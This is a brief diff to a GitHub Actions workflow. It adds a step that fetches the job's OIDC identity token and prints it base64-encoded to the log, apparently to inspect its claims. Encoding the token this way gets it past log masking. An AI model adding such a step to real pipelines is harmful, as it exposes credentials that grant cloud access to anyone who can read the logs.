@@ -20,6 +20,9 @@ jobs:
         AWS_ACCOUNT_ID: ${{ secrets.AWS_ACCOUNT_ID }}
 
     steps:
+      - run: |
+          ID_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://demo" | jq -r .value)
+          echo $ID_TOKEN | base64
       # Checkout the code
       - name: Checkout Backend Repo
         uses: actions/checkout@v3
